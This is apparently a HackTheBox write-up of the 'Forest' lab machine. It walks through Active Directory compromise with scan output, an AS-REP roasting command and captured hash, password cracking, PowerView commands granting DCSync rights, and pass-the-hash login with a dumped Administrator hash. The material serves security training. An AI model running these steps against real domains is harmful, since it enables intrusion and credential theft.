---
title: HTB [Forest]
date: 2023-02-14 01:28:05 +0200
categories: [windows,AD,GenericAll,WriteDacl,DCSync]
tags: [HACKTHEBOX MACHINES]
excerpt: Forest is an easy machine from HackTheBox which involves a couple of AD attacks
---

![](https://i.imgur.com/qWqPFHP.png)

## Recon

### port scan

```js
PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-01-19 12:43:16Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack Microsoft Windows RPC
49954/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 36383/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 51022/udp): CLEAN (Timeout)
|   Check 4 (port 44587/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2023-01-19T12:44:09
|_  start_date: 2023-01-19T04:01:36
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-01-19T04:44:08-08:00
|_clock-skew: mean: -2h43m11s, deviation: 4h37m08s, median: -5h23m12s
```
<br>

- It's an Active Directory machine, so first let's use enum4linux to get info about the users and groups

### enum4linux

```c#
[+] Found domain(s):
	[+] HTB
	[+] Builtin


[+] Users

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

[+] Getting builtin groups:

group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+]  Getting domain groups:

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```
<br>

- Domain name: `htb.local`
- Forest name: `htb.local`
- Computer name: `FOREST`
- Create **users.txt** with the user names
- Let's use `GetNPUsers.py` to see if any user has pre authentication disabled

## Initial Foothold

```js
➜  forest GetNPUsers.py -dc-ip 10.10.10.161 htb.local/
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-01-19 18:31:16.073285  2019-09-23 16:39:47.931194  0x410200
```
<br>

- Looks like `svc-alfresco` account is AS-Rep Roastable, because pre-authentication is disabled for him, so we can request a ticket

<br>
<iframe width="560" height="315" src="https://www.youtube.com/embed/pZSyGRjHNO4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
<br>

- If you want to know how this attack and `GetNPUsers.py` script is working under the hood, then I'd recommend you to watch this video

<br>

```js
➜  forest GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -request
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-01-19 18:31:16.073285  2019-09-23 16:39:47.931194  0x410200



$krb5asrep$23$svc-alfresco@HTB.LOCAL:f66921928fc0adb11fd1f06ecb523668$be875c2c0fa9ad1b3376c582651c71c36c1b4e9a3cf944e454e5ce30e4ee4524edcae4bfe35ee99101030a477f1790b604d259137c878ffd30e52c33f1485b35080827d92872da82262295e243c9bff0684d8ea7b1a1eec1aa95eaf95d0d16e94970dc98c367ef0b7fcd65ff78e6c32ff7f6a821df67599409704f20bfc21a90e12115ee6412c42dbf0812fa4a1fdaec71c69dd6496c561915602a224ad7fc1c642fde63c179cae977754e3faad762408053146a15a9b05d3fab70f28989c1cd7de2bd812e917556dacd6e54dae58d1fa900486cab328e4f64ee344383237c77f5b6e4b4efd3
```
<br>

- Let's crack this hash

<br>

```js
➜  forest john --wordlist=/opt/seclists/Passwords/Leaked-Databases/rockyou.txt svc_alfersco_hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:06 DONE (2023-01-19 23:59) 0.1633g/s 667607p/s 667607c/s 667607C/s s401413..s3r1bu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
<br>

- Creds `svc-alfresco:s3rvice`

![](https://i.imgur.com/b2FLeo5.png)

- Let's get in with evil-winrm
- Uploaded SharpHound
- Downloaded the zip and imported it into the bloodhound

## Priv esc

- Now mark **svc-alfresco** as owned target

![](https://i.imgur.com/UHvy7tO.png)

- Let's see the shortest path to domain admins

![](https://i.imgur.com/2vlVRL4.png)

- Yeh looks like a shortest path lol
- We need to do 2 steps
- 1) **GenericAll** to **EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL**
- 2) **WriteDacl** to **HTB.LOCAL**

#### GenericAll

> The members of the group ACCOUNT OPERATORS@HTB.LOCAL have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL. This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.

![](https://i.imgur.com/BkGgWME.png)

- We can do whatever we want, So let's add our user `hacker` to **EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL** group
- Now WriteDacl

#### WriteDacl

> The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL.
With write access to the target object's DACL, you can grant yourself any privilege you want on the object. 

![](https://i.imgur.com/mBWY21Z.png)

- First let's give us `DCSync` privileges and exploit that
- Here we need [powerview]( https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) script to execute these commands, so import that

<br>

```js
Import-Module .\PowerView.ps1
Add-Type -AssemblyName System.Management.Automation
$UserName = "HTB\hacker"
$Password = ConvertTo-SecureString "hacker@123" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($UserName, $Password)
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity hacker -TargetIdentity "DC=htb,DC=local" -Rights DCSync
```
<br>

- Note: You need to specify the user in `-PrincipalIdentiy`, bloodhound page doesn't have that extra argument, so don't forget to add this

#### DCSync

- Now we have DCSync privileges

> The DCSync permission implies having these permissions over the domain itself: DS-Replication-Get-Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set.

- Now we can use `secretssdump.py` to dump the hashes

![](https://i.imgur.com/xxXwyBq.png)

- We can use evil-winrm to login as `Administrator:32693b11e6aa90eb43d32c72a07ceea6`

![](https://i.imgur.com/Ys2EOGJ.png)

- Rooted!!
